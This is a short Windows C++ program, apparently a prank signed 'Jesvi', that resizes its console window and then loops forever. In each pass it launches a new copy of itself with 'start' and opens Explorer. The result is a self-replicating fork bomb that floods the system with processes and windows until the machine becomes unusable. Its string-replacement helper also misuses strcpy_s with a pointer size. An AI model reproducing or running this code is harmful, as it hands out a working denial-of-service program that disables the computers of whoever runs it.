#include <iostream>
#include <conio.h>
#include <windows.h>

using namespace std;


char* p_exe_path;
HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);

char* replaceWord(const char* s, const char* oldW,
    const char* newW)
{

    char* result;
    int i, cnt = 0;
    int newWlen = strlen(newW);
    int oldWlen = strlen(oldW);

    // Counting the number of times old word 
    // occur in the string 
    for (i = 0; s[i] != '\0'; i++)
    {
        if (strstr(&s[i], oldW) == &s[i])
        {
            cnt++;

            // Jumping to index after the old word. 
            i += oldWlen - 1;
        }
    }

    // Making new string of enough length 
    result = (char*)malloc(i + cnt * (newWlen - oldWlen) + 1);

    i = 0;
    while (*s)
    {
        // compare the substring with the result 
        if (strstr(s, oldW) == s)
        {
            strcpy_s(&result[i], sizeof(newW), newW);
            i += newWlen;
            s += oldWlen;
        }
        else
            result[i++] = *s++;
    }

    result[i] = '\0';
    return result;
}

int main(int argc, char* argv[])
{

    SetConsoleTextAttribute(console, 240);

    string h;
    char c[] = "\\";
    char d[] = "\\\\";
    char* result = NULL;

	HWND console = GetConsoleWindow();
	RECT ConsoleRect;
	GetWindowRect(console, &ConsoleRect);
	MoveWindow(console, ConsoleRect.left, ConsoleRect.top, 100000, 100000, TRUE);

	result = replaceWord(argv[0], c, d);

    h = result;
    
    free(result);
    
    while (1)
    {
        cout << "Hope You Like My Work ! - Jesvi";
        system(("start " + h).c_str());
        system("explorer ");
    }
	
    return 0;

}